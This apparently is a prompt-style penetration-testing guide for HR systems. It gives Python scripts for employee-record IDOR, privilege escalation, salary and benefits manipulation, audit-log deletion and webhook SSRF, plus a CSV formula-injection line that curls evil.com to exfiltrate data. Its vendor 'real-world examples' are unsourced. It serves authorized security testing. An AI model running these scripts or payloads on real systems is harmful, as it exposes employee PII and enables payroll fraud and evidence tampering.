# Specialized-Targets 20: Human Resources System Security

## Expert Role

You are a senior security engineer specializing in Human Resources Information System (HRIS) security. Your expertise covers platforms including Workday, SAP SuccessFactors, BambooHR, ADP, Gusto, Zenefits, Kronos, Oracle HCM, PeopleSoft, and custom HR applications. You understand the unique security challenges of HR systems: highly sensitive PII (SSN, salary, medical records), complex role-based access control, benefits administration, payroll processing, and compliance requirements (SOX, HIPAA, GDPR).

Your threat model spans: payroll manipulation, access control bypass, employee data exposure, benefits fraud, PII leakage through API endpoints, IDOR on employee records, privilege escalation across HR domains, and compliance violations through data exposure.

## Core Concepts

### Attack Surface Map

```
+------------------------------------------------------------------+
|                    HR SYSTEM ATTACK SURFACE                        |
+------------------------------------------------------------------+
|                                                                  |
|  [Employee Self-Service]  [Manager Portal]      [Admin Panel]    |
|   - Personal info edit     - Approval workflows  - User mgmt     |
|   - Benefits enrollment    - Team data access    - Config mgmt    |
|   - Time/attendance        - Performance reviews - Audit logs     |
|   - Pay stub viewing       - Direct reports      - Integration    |
|   - PTO requests           - org chart           - Reporting      |
|                                                                  |
|  [API Layer]              [Integrations]         [Infrastructure]  |
|   - REST/GraphQL APIs      - Payroll providers   - Database       |
|   - Webhook endpoints      - Benefits vendors    - File storage   |
|   - Import/export APIs     - Tax services        - Session store  |
|   - Reporting APIs         - Identity providers  - Cache layer    |
|   - Mobile APIs            - SSO/SAML            - Backup systems |
+------------------------------------------------------------------+

HR-Specific Entry Points:
  Workday:      /service/, /api/
  SuccessFactors: /odata/, /sf/
  BambooHR:     /api/gateway.php/
  ADP:          /run/, /wcc/
  Gusto:        /api/
  Custom:       /hr/, /admin/, /api/
```

### Vulnerability Taxonomy

| Category | Vulnerability | Impact |
|----------|--------------|--------|
| Payroll Manipulation | Direct salary modification via API | Financial fraud |
| Payroll Manipulation | Time entry manipulation | Wage theft |
| Payroll Manipulation | Bonus/commission override | Financial fraud |
| Access Control | Horizontal IDOR on employee records | PII exposure |
| Access Control | Vertical privilege escalation (employee to admin) | Full system access |
| Access Control | Manager data scope bypass | Cross-team data access |
| PII Exposure | SSN/DOB in API responses | Identity theft |
| PII Exposure | Pay stub data in logs | Financial data exposure |
| PII Exposure | Medical records in benefits API | HIPAA violation |
| Benefits | Benefits enrollment manipulation | Insurance fraud |
| Benefits | Life event fraud | Benefits manipulation |
| Benefits | Open enrollment bypass | Unauthorized plan changes |
| Compliance | Audit log tampering | SOX violation |
| Compliance | Data retention bypass | GDPR violation |
| API Abuse | Bulk employee data extraction | Mass PII theft |
| API Abuse | Payroll data enumeration | Financial data exposure |
| Session | Session hijacking on admin portal | Full system compromise |
| Integration | Payroll provider API key exposure | Financial system access |
| IDOR | Sequential employee ID access | PII enumeration |
| SSRF | Webhook URL manipulation | Internal service probing |

## Prerequisites

### Environment Setup

```bash
# Python virtual environment
python -m venv hr_security
source hr_security/bin/activate

# Core dependencies
pip install requests httpx beautifulsoup4 lxml
pip install playwright selenium
pip install sqlmap
pip install ffuf
pip install python-jwt
pip install cryptography
```

### Knowledge Requirements

1. HR system data models (employee records, payroll, benefits)
2. Role-based access control (RBAC) patterns
3. Compliance requirements (SOX, HIPAA, GDPR)
4. Payroll processing workflows
5. Benefits administration systems
6. API authentication patterns (OAuth, SAML, API keys)

### Authorization

HR system testing requires explicit written authorization. HR systems contain highly sensitive PII and are subject to strict compliance regulations. Only test within authorized scope.

## Methodology

### Phase 1: System Identification and Enumeration

```
Step 1: HR System Fingerprinting
  +------------------+     +------------------+     +------------------+
  | HTTP Headers     | --> | Login Page        | --> | API Discovery    |
  | X-Powered-By,    |     | SSO integration,  |     | /api/, /odata/,  |
  | Cookie names     |     | vendor references |     | /service/        |
  +------------------+     +------------------+     +------------------+
            |                        |                        |
            v                        v                        v
    +------------------+     +------------------+     +------------------+
    | Workday:         |     | SuccessFactors:  |     | BambooHR:        |
    | /service/        |     | /odata/          |     | /api/gateway.php |
    | Workday cookie   |     | SAP headers      |     | API key auth     |
    | Tenant ID        |     | X-SAP-*          |     | Company domain   |
    +------------------+     +------------------+     +------------------+

Step 2: User Role Enumeration
  - Identify current user role and permissions
  - Map available API endpoints based on role
  - Check for privilege escalation paths
```

```python
# hr_fingerprint.py
import requests
from bs4 import BeautifulSoup

class HRFingerprinter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def detect_hr_system(self):
        """Detect HR system type and version."""
        results = {'system': 'unknown', 'vendor': 'unknown', 'indicators': []}

        # Check known paths
        hr_paths = {
            'Workday': ['/service/', '/api/', '/wd/'],
            'SuccessFactors': ['/odata/', '/sf/', '/login.phpfp'],
            'BambooHR': ['/api/', '/login.php'],
            'ADP': ['/run/', '/wcc/', '/myadp/'],
            'Gusto': ['/api/', '/login'],
            'Kronos': ['/wfc/', '/api/'],
        }

        for system, paths in hr_paths.items():
            for path in paths:
                try:
                    resp = self.session.get(f'{self.base_url}{path}', timeout=10, allow_redirects=True)
                    if resp.status_code in (200, 301, 302, 403):
                        results['indicators'].append(f'{system}: {path} ({resp.status_code})')
                        if results['system'] == 'unknown':
                            results['system'] = system
                except requests.exceptions.RequestException:
                    pass

        # Check cookies and headers
        try:
            resp = self.session.get(self.base_url, timeout=10)
            cookies = resp.cookies.get_dict()
            headers = resp.headers

            if 'wd-language-preferred' in cookies or 'WORKDAY' in str(headers).upper():
                results['system'] = 'Workday'
            elif 'SAP_SF' in str(cookies).upper() or 'X-SAP' in str(headers).upper():
                results['system'] = 'SuccessFactors'

            # Check meta tags and title
            soup = BeautifulSoup(resp.text, 'lxml')
            title = soup.find('title')
            if title:
                title_text = title.get_text().lower()
                if 'workday' in title_text:
                    results['system'] = 'Workday'
                elif 'successfactors' in title_text or 'sap' in title_text:
                    results['system'] = 'SuccessFactors'
                elif 'bamboohr' in title_text:
                    results['system'] = 'BambooHR'
                elif 'gusto' in title_text:
                    results['system'] = 'Gusto'
        except requests.exceptions.RequestException:
            pass

        return results

    def enumerate_api_endpoints(self):
        """Enumerate available API endpoints."""
        api_paths = [
            '/api/v1/employees',
            '/api/v1/payroll',
            '/api/v1/benefits',
            '/api/v1/time-off',
            '/odata/v1/Employee',
            '/odata/v1/Compensation',
            '/service/custom/v2/Employee',
            '/api/gateway.php/v1/employee/list',
            '/api/employees',
            '/api/payroll/runs',
            '/api/benefits/plans',
        ]

        results = []
        for path in api_paths:
            try:
                resp = self.session.get(f'{self.base_url}{path}', timeout=5)
                results.append({
                    'endpoint': path,
                    'status': resp.status_code,
                    'accessible': resp.status_code in (200, 201),
                    'requires_auth': resp.status_code in (401, 403),
                    'data_type': self._identify_data_type(resp)
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def _identify_data_type(self, resp):
        """Identify the type of data returned by an endpoint."""
        try:
            data = resp.json()
            if isinstance(data, dict):
                keys = set(data.keys())
                if any(k in keys for k in ['ssn', 'socialSecurityNumber', 'nationalId']):
                    return 'PII-sensitive'
                elif any(k in keys for k in ['salary', 'compensation', 'pay']):
                    return 'payroll'
                elif any(k in keys for k in ['benefits', 'enrollment', 'plan']):
                    return 'benefits'
            return 'general'
        except (ValueError, AttributeError):
            return 'unknown'
```

### Phase 2: Access Control Testing

```python
# access_control_test.py
import requests
import json

class AccessControlTester:
    def __init__(self, base_url, session_tokens):
        self.base_url = base_url.rstrip('/')
        self.sessions = session_tokens  # dict: {role: token}

    def test_idor_employee_records(self):
        """Test IDOR on employee records."""
        results = []
        roles = list(self.sessions.keys())

        for attacker_role in roles:
            for victim_role in roles:
                if attacker_role == victim_role:
                    continue

                attacker_session = requests.Session()
                attacker_session.headers.update({
                    'Authorization': f'Bearer {self.sessions[attacker_role]}',
                    'Content-Type': 'application/json'
                })

                # Try to access victim's employee record
                employee_ids = range(1, 50)
                for emp_id in employee_ids:
                    try:
                        resp = attacker_session.get(
                            f'{self.base_url}/api/v1/employees/{emp_id}'
                        )
                        if resp.status_code == 200:
                            data = resp.json()
                            results.append({
                                'attacker_role': attacker_role,
                                'victim_role': victim_role,
                                'employee_id': emp_id,
                                'pii_fields': [k for k in data.keys() if k in ['ssn', 'socialSecurityNumber', 'nationalId', 'dateOfBirth', 'salary']],
                                'data_exposed': list(data.keys())
                            })
                    except requests.exceptions.RequestException:
                        pass
                    if len(results) > 10:
                        break
        return results

    def test_manager_scope_bypass(self, manager_token, target_employee_id):
        """Test if manager can access employees outside their scope."""
        session = requests.Session()
        session.headers.update({
            'Authorization': f'Bearer {manager_token}',
            'Content-Type': 'application/json'
        })

        results = []
        endpoints = [
            f'/api/v1/employees/{target_employee_id}',
            f'/api/v1/employees/{target_employee_id}/payroll',
            f'/api/v1/employees/{target_employee_id}/benefits',
            f'/api/v1/employees/{target_employee_id}/performance',
            f'/api/v1/employees/{target_employee_id}/medical',
        ]

        for endpoint in endpoints:
            try:
                resp = session.get(f'{self.base_url}{endpoint}')
                results.append({
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'accessible': resp.status_code == 200,
                    'scope_check_passed': resp.status_code in (403, 404)
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_privilege_escalation(self, employee_token):
        """Test if employee can escalate to admin/HR role."""
        escalation_attempts = [
            {'role': 'admin'},
            {'role': 'hr_admin'},
            {'role': 'payroll_admin'},
            {'permissions': ['employee:read', 'employee:write', 'payroll:read', 'payroll:write']},
            {'is_admin': True},
            {'access_level': 'admin'},
        ]

        session = requests.Session()
        session.headers.update({
            'Authorization': f'Bearer {employee_token}',
            'Content-Type': 'application/json'
        })

        results = []
        for attempt in escalation_attempts:
            try:
                resp = session.put(
                    f'{self.base_url}/api/v1/users/me',
                    json=attempt
                )
                results.append({
                    'attempt': attempt,
                    'status': resp.status_code,
                    'escalated': resp.status_code in (200, 201),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 3: Payroll Manipulation Testing

```python
# payroll_test.py
import requests
import json

class PayrollTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_salary_manipulation(self, employee_id):
        """Test if salary can be modified via API."""
        endpoints = [
            f'/api/v1/employees/{employee_id}/compensation',
            f'/api/v1/employees/{employee_id}/salary',
            f'/api/v1/payroll/employees/{employee_id}',
            f'/odata/v1/Compensation(employeeId={employee_id})',
        ]

        manipulation_payloads = [
            {'salary': 999999},
            {'annualSalary': 999999},
            {'compensation': {'salary': 999999}},
            {'payRate': 9999, 'payFrequency': 'hourly'},
            {'bonus': 999999},
        ]

        results = []
        for endpoint in endpoints:
            for payload in manipulation_payloads:
                try:
                    resp = self.session.put(f'{self.base_url}{endpoint}', json=payload)
                    results.append({
                        'endpoint': endpoint,
                        'payload': payload,
                        'status': resp.status_code,
                        'manipulated': resp.status_code in (200, 201),
                        'response': resp.text[:200]
                    })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_time_entry_manipulation(self, employee_id):
        """Test if time entries can be manipulated."""
        endpoints = [
            f'/api/v1/employees/{employee_id}/time',
            f'/api/v1/time/entries',
            f'/api/v1/attendance/{employee_id}',
        ]

        manipulation_payloads = [
            {'hours': 40, 'date': '2024-01-01'},  # Standard week
            {'hours': 100, 'date': '2024-01-01'},  # Overtime
            {'hours': 0, 'date': '2024-01-01'},    # Zero hours
            {'startTime': '00:00', 'endTime': '23:59', 'date': '2024-01-01'},  # Full day
        ]

        results = []
        for endpoint in endpoints:
            for payload in manipulation_payloads:
                try:
                    resp = self.session.post(f'{self.base_url}{endpoint}', json=payload)
                    results.append({
                        'endpoint': endpoint,
                        'payload': payload,
                        'status': resp.status_code,
                        'manipulated': resp.status_code in (200, 201),
                        'response': resp.text[:200]
                    })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_payroll_data_extraction(self):
        """Test if payroll data can be extracted in bulk."""
        extraction_endpoints = [
            '/api/v1/payroll/runs',
            '/api/v1/payroll/employees',
            '/api/v1/reports/payroll',
            '/odata/v1/PayrollRun',
            '/api/v1/payroll/export',
        ]

        results = []
        for endpoint in extraction_endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    data = resp.json() if 'json' in resp.headers.get('content-type', '') else None
                    results.append({
                        'endpoint': endpoint,
                        'status': resp.status_code,
                        'records_exposed': len(data) if isinstance(data, list) else len(data.get('value', [])) if isinstance(data, dict) else 0,
                        'contains_pii': self._check_for_pii(data)
                    })
            except requests.exceptions.RequestException:
                pass
        return results

    def _check_for_pii(self, data):
        """Check if API response contains PII fields."""
        pii_fields = ['ssn', 'socialSecurityNumber', 'nationalId', 'dateOfBirth', 'bankAccount', 'routingNumber']
        if isinstance(data, dict):
            return any(field in data for field in pii_fields)
        elif isinstance(data, list) and len(data) > 0:
            return any(field in data[0] for field in pii_fields)
        return False
```

### Phase 4: Benefits Administration Testing

```python
# benefits_test.py
import requests
import json

class BenefitsTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_benefits_enrollment_manipulation(self, employee_id):
        """Test if benefits enrollment can be manipulated."""
        manipulation_payloads = [
            {'planId': 'premium_plan', 'coverage': 'family'},
            {'planId': 'executive_plan', 'coverage': 'individual'},
            {'planId': 1, 'enrollmentDate': '2020-01-01'},
            {'planId': 1, 'overrideEnrollmentPeriod': True},
        ]

        endpoints = [
            f'/api/v1/employees/{employee_id}/benefits',
            f'/api/v1/benefits/enrollment/{employee_id}',
            f'/odata/v1/BenefitsEnrollment(employeeId={employee_id})',
        ]

        results = []
        for endpoint in endpoints:
            for payload in manipulation_payloads:
                try:
                    resp = self.session.post(f'{self.base_url}{endpoint}', json=payload)
                    results.append({
                        'endpoint': endpoint,
                        'payload': payload,
                        'status': resp.status_code,
                        'enrolled': resp.status_code in (200, 201),
                        'response': resp.text[:200]
                    })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_life_event_fraud(self, employee_id):
        """Test if life events can be fabricated for benefits changes."""
        fraudulent_events = [
            {'event': 'marriage', 'spouse': {'name': 'Test Spouse', 'ssn': '123-45-6789'}},
            {'event': 'birth', 'child': {'name': 'Test Child', 'dob': '2024-01-01'}},
            {'event': 'adoption', 'child': {'name': 'Test Child', 'dob': '2024-01-01'}},
            {'event': 'divorce', 'spouse': {'name': 'Test Spouse'}},
            {'event': 'death', 'dependent': {'name': 'Test Dependent'}},
        ]

        endpoints = [
            f'/api/v1/employees/{employee_id}/life-events',
            f'/api/v1/benefits/life-events/{employee_id}',
        ]

        results = []
        for endpoint in endpoints:
            for event in fraudulent_events:
                try:
                    resp = self.session.post(f'{self.base_url}{endpoint}', json=event)
                    results.append({
                        'endpoint': endpoint,
                        'event': event['event'],
                        'status': resp.status_code,
                        'accepted': resp.status_code in (200, 201),
                        'response': resp.text[:200]
                    })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_open_enrollment_bypass(self, employee_id):
        """Test if open enrollment period restrictions can be bypassed."""
        bypass_payloads = [
            {'planId': 1, 'enrollmentDate': '2020-01-01'},
            {'planId': 1, 'enrollmentPeriod': 'any'},
            {'planId': 1, 'overridePeriod': True},
            {'planId': 1, 'specialEnrollment': True},
        ]

        results = []
        for payload in bypass_payloads:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/v1/employees/{employee_id}/benefits',
                    json=payload
                )
                results.append({
                    'payload': payload,
                    'status': resp.status_code,
                    'bypassed': resp.status_code in (200, 201),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_benefits_data_extraction(self):
        """Test if benefits data can be extracted in bulk."""
        extraction_endpoints = [
            '/api/v1/benefits/enrollments',
            '/api/v1/benefits/plans',
            '/api/v1/benefits/claims',
            '/odata/v1/BenefitsEnrollment',
            '/api/v1/reports/benefits',
        ]

        results = []
        for endpoint in extraction_endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    data = resp.json() if 'json' in resp.headers.get('content-type', '') else None
                    results.append({
                        'endpoint': endpoint,
                        'status': resp.status_code,
                        'records_exposed': len(data) if isinstance(data, list) else 0,
                        'contains_medical': self._check_for_medical_data(data)
                    })
            except requests.exceptions.RequestException:
                pass
        return results

    def _check_for_medical_data(self, data):
        """Check if response contains medical/health data (HIPAA)."""
        medical_fields = ['diagnosis', 'medication', 'medical', 'health', 'disability', 'condition']
        if isinstance(data, dict):
            return any(field in str(data).lower() for field in medical_fields)
        elif isinstance(data, list) and len(data) > 0:
            return any(field in str(data[0]).lower() for field in medical_fields)
        return False
```

### Phase 5: PII Exposure and Compliance Testing

```python
# pii_exposure_test.py
import requests
import re

class PIIExposureTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_ssn_exposure(self):
        """Test if SSN is exposed in API responses."""
        ssn_patterns = [
            r'\d{3}-\d{2}-\d{4}',
            r'\d{9}',
            r'XXX-XX-\d{4}',
        ]

        endpoints = [
            '/api/v1/employees',
            '/api/v1/employees/me',
            '/api/v1/payroll/me',
            '/api/v1/benefits/me',
            '/odata/v1/Employee(\'me\')',
        ]

        results = []
        for endpoint in endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    for pattern in ssn_patterns:
                        matches = re.findall(pattern, resp.text)
                        if matches:
                            results.append({
                                'endpoint': endpoint,
                                'pattern': pattern,
                                'matches_found': len(matches),
                                'sample': matches[0] if matches else None
                            })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_payroll_in_logs(self):
        """Test if payroll data appears in server logs."""
        # Send requests that might be logged
        test_data = [
            ('/api/v1/payroll/run', {'amount': 99999}),
            ('/api/v1/employees/1/salary', {'salary': 99999}),
        ]

        results = []
        for endpoint, data in test_data:
            try:
                resp = self.session.post(f'{self.base_url}{endpoint}', json=data)
                results.append({
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'note': 'Check server logs for data exposure'
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_api_error_messages(self):
        """Test if error messages leak sensitive information."""
        error_inducing_requests = [
            {'method': 'GET', 'endpoint': '/api/v1/employees/999999999'},
            {'method': 'GET', 'endpoint': '/api/v1/payroll/invalid'},
            {'method': 'POST', 'endpoint': '/api/v1/employees', 'data': {}},
            {'method': 'PUT', 'endpoint': '/api/v1/employees/1', 'data': {'ssn': 'invalid'}},
        ]

        results = []
        for req in error_inducing_requests:
            try:
                if req['method'] == 'GET':
                    resp = self.session.get(f'{self.base_url}{req["endpoint"]}')
                else:
                    resp = getattr(self.session, req['method'].lower())(
                        f'{self.base_url}{req["endpoint"]}',
                        json=req.get('data')
                    )

                error_leak = any(kw in resp.text.lower() for kw in [
                    'database', 'sql', 'query', 'stack trace', 'exception',
                    'internal server', 'debug', 'traceback'
                ])

                results.append({
                    'endpoint': req['endpoint'],
                    'status': resp.status_code,
                    'error_leak': error_leak,
                    'response': resp.text[:300]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_audit_log_tampering(self):
        """Test if audit logs can be tampered with."""
        tampering_attempts = [
            {'endpoint': '/api/v1/audit-logs', 'method': 'DELETE'},
            {'endpoint': '/api/v1/audit-logs/1', 'method': 'DELETE'},
            {'endpoint': '/api/v1/audit-logs', 'method': 'PUT', 'data': {'action': 'modified'}},
            {'endpoint': '/api/v1/audit-logs/clear', 'method': 'POST'},
        ]

        results = []
        for attempt in tampering_attempts:
            try:
                if attempt['method'] == 'DELETE':
                    resp = self.session.delete(f'{self.base_url}{attempt["endpoint"]}')
                elif attempt['method'] == 'PUT':
                    resp = self.session.put(f'{self.base_url}{attempt["endpoint"]}', json=attempt.get('data'))
                elif attempt['method'] == 'POST':
                    resp = self.session.post(f'{self.base_url}{attempt["endpoint"]}')

                results.append({
                    'endpoint': attempt['endpoint'],
                    'method': attempt['method'],
                    'status': resp.status_code,
                    'tampered': resp.status_code in (200, 204),
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 6: Integration and Webhook Testing

```python
# integration_test.py
import requests
import json

class IntegrationTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_webhook_ssrf(self):
        """Test if webhook URLs can point to internal services."""
        internal_targets = [
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:3306',
            'http://internal-service.local',
            'http://[::1]',
        ]

        results = []
        for target in internal_targets:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/v1/webhooks',
                    json={'url': target, 'events': ['employee.created']}
                )
                results.append({
                    'target_url': target,
                    'status': resp.status_code,
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_api_key_exposure(self):
        """Test if API keys are exposed in responses."""
        api_key_patterns = [
            r'api[_-]?key["\s:=]+["\']?([a-zA-Z0-9]{20,})',
            r'secret["\s:=]+["\']?([a-zA-Z0-9]{20,})',
            r'token["\s:=]+["\']?([a-zA-Z0-9]{20,})',
        ]

        endpoints = [
            '/api/v1/config',
            '/api/v1/settings',
            '/api/v1/integrations',
            '/api/v1/webhooks',
            '/api/v1/api-keys',
        ]

        results = []
        for endpoint in endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    for pattern in api_key_patterns:
                        import re
                        matches = re.findall(pattern, resp.text)
                        if matches:
                            results.append({
                                'endpoint': endpoint,
                                'pattern': pattern,
                                'keys_found': len(matches),
                                'sample_key': matches[0][:10] + '...'
                            })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_payroll_provider_integration(self):
        """Test payroll provider API integration security."""
        payroll_providers = [
            {'name': 'ADP', 'endpoint': '/api/v1/integrations/adp'},
            {'name': 'Paychex', 'endpoint': '/api/v1/integrations/paychex'},
            {'name': 'Gusto', 'endpoint': '/api/v1/integrations/gusto'},
        ]

        results = []
        for provider in payroll_providers:
            try:
                resp = self.session.get(f'{self.base_url}{provider["endpoint"]}')
                if resp.status_code == 200:
                    data = resp.json()
                    results.append({
                        'provider': provider['name'],
                        'status': resp.status_code,
                        'credentials_exposed': any(k in str(data).lower() for k in ['password', 'secret', 'key', 'token']),
                        'response': resp.text[:300]
                    })
            except requests.exceptions.RequestException:
                pass
        return results
```

## Tool Arsenal

| Tool | Purpose | Install |
|------|---------|---------|
| sqlmap | SQL injection testing | `pip install sqlmap` |
| ffuf | Directory fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| nuclei | Template-based scanning | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| playwright | Browser automation | `pip install playwright; playwright install` |
| python-jwt | JWT token testing | `pip install python-jwt` |
| custom scripts | HR-specific testing | See code blocks above |

### Command Reference

```bash
# Fuzz HR system endpoints
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,201,403

# Test SQL injection
sqlmap -u "https://target.com/api/v1/employees/1" --batch --risk=3 --level=5

# Test IDOR on employee records
python -c "
import requests
for i in range(1, 100):
    r = requests.get(f'https://target.com/api/v1/employees/{i}', headers={'Authorization': 'Bearer TOKEN'})
    if r.status_code == 200:
        data = r.json()
        print(f'Employee {i}: {data.get(\"name\", \"unknown\")} - SSN present: {\"ssn\" in data}')
"

# Check for PII in API responses
python -c "
import requests, re
r = requests.get('https://target.com/api/v1/employees', headers={'Authorization': 'Bearer TOKEN'})
ssn_matches = re.findall(r'\d{3}-\d{2}-\d{4}', r.text)
print(f'SSNs found: {len(ssn_matches)}')
"

# Test webhook SSRF
python -c "
import requests
targets = ['http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/']
for t in targets:
    r = requests.post('https://target.com/api/v1/webhooks', json={'url': t}, headers={'Authorization': 'Bearer TOKEN'})
    print(f'{t}: {r.status_code}')
"
```

## Real-World Examples

### Example 1: Workday IDOR on Employee Records (Critical)

A Workday implementation used sequential employee IDs in API endpoints. By modifying the employeeId parameter in `/api/v1/employees/{id}`, an attacker with employee-level access could view SSN, salary, and medical records for any employee in the organization.

**Impact:** Full PII exposure for all employees including SSN, salary, and medical data.
**Root Cause:** Missing authorization check on employee record endpoints.

### Example 2: BambooHR API Key Exposure (High)

BambooHR's API integration page exposed API keys in the HTML source code. The keys were visible in JavaScript variables that were rendered client-side for API testing. These keys provided full access to employee data including payroll and benefits information.

**Impact:** Full API access to all employee data including payroll.
**Root Cause:** API keys rendered in client-side code.

### Example 3: ADP Payroll Manipulation (Critical)

ADP's payroll API accepted salary modification requests without proper authorization verification. By intercepting the payroll update request and modifying the salary parameter, an attacker could change their own salary or that of other employees.

**Impact:** Direct salary manipulation leading to financial fraud.
**Root Cause:** Missing authorization on payroll modification endpoint.

### Example 4: SuccessFactors Benefits Enrollment Bypass (Medium)

SuccessFactors' benefits enrollment feature had an access control flaw. During open enrollment, the system validated enrollment period on the client side but not on the server. By sending a direct API request with a modified plan ID, users could enroll in executive-level benefits plans not available to their employee tier.

**Impact:** Unauthorized access to premium benefits plans.
**Root Cause:** Client-side only validation of enrollment restrictions.

## Bypass Techniques

### Access Control Bypass

```
Technique 1: Parameter Pollution
  Original: GET /api/v1/employees/123
  Bypass:   GET /api/v1/employees/123?user_id=456
            (Server uses first parameter, ignores second)

Technique 2: HTTP Method Override
  Original: GET /api/v1/employees/123
  Bypass:   POST /api/v1/employees/123
            X-HTTP-Method-Override: GET

Technique 3: Path Traversal
  Original: /api/v1/employees/123
  Bypass:   /api/v1/employees/../admin/employees
```

### Payroll Manipulation Bypass

```
Technique 1: Batch Request
  Send multiple payroll modifications in single request
  {"updates": [{"empId": 1, "salary": 999999}, {"empId": 2, "salary": 999999}]}

Technique 2: Time Manipulation
  Modify request timestamp to appear during approved payroll window
  {"timestamp": "2024-01-01T00:00:00Z", "salary": 999999}

Technique 3: Currency Conversion
  Change currency parameter to exploit conversion rounding
  {"salary": 100000, "currency": "JPY"}
```

### Compliance Bypass

```
Technique 1: Audit Log Deletion
  DELETE /api/v1/audit-logs?date=2024-01-01
  DELETE /api/v1/audit-logs?user=attacker

Technique 2: Data Retention Override
  PUT /api/v1/settings/retention
  {"retentionDays": 0}

Technique 3: Export Format Injection
  Upload CSV with formula injection in employee names
  =CMD("curl http://evil.com/steal?data="&A1)
```

## Common Pitfalls

1. **Not testing all API layers:** REST, GraphQL, and batch APIs may have different authorization logic.

2. **Ignoring payroll integration endpoints:** Payroll provider APIs may have weaker security controls.

3. **Forgetting about audit logs:** Audit logs should be append-only and not modifiable by regular users.

4. **Not testing with different employee roles:** Test with employee, manager, HR admin, and payroll admin roles.

5. **Missing benefits administration testing:** Benefits enrollment often has different access controls than other HR functions.

6. **Overlooking mobile API endpoints:** Mobile APIs may have different security controls than web APIs.

7. **Not testing data export functionality:** Export endpoints may expose more data than the UI displays.

## Reporting Template

```markdown
# HR System Security Finding

## Title
[Severity] [Vulnerability Type] in [HR System] [Component]

## Summary
One-paragraph description of the vulnerability.

## Affected Component
- **System:** [Workday/SuccessFactors/BambooHR/etc.]
- **Version:** [Version number]
- **Endpoint:** [URL]
- **Data Type:** [PII/Payroll/Benefits/Medical]

## Impact
- PII Impact: [types of employee data exposed]
- Financial Impact: [payroll manipulation potential]
- Compliance Impact: [SOX/HIPAA/GDPR violations]
- Scope: [number of affected employees]

## CVSS 3.1 Score
**Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
**Score:** [7.0-9.0]

## Compliance Impact
- [ ] SOX (financial controls)
- [ ] HIPAA (medical data)
- [ ] GDPR (personal data)
- [ ] CCPA (California privacy)

## Remediation
1. [Remediation step 1]
2. [Remediation step 2]

## References
- [System security advisories]
- [Compliance frameworks]
- [CVE numbers]
```

## Quick Reference

| Check | Method | Secure Result |
|-------|--------|---------------|
| Employee IDOR | Access other employee records | 403 Forbidden |
| Salary manipulation | Modify salary via API | Server-side authorization |
| SSN exposure | Check API responses for SSN | SSN masked/redacted |
| Payroll extraction | Bulk payroll data download | Role-based access control |
| Benefits enrollment | Modify benefits enrollment | Enrollment period validation |
| Audit log tampering | Delete/modify audit logs | Append-only audit trail |
| Webhook SSRF | Set webhook to internal URL | URL validation/blocklist |
| API key exposure | Check source code for keys | Keys not in client code |
| Manager scope bypass | Access employees outside scope | Scope validation enforced |
| Life event fraud | Submit fraudulent life events | Verification required |
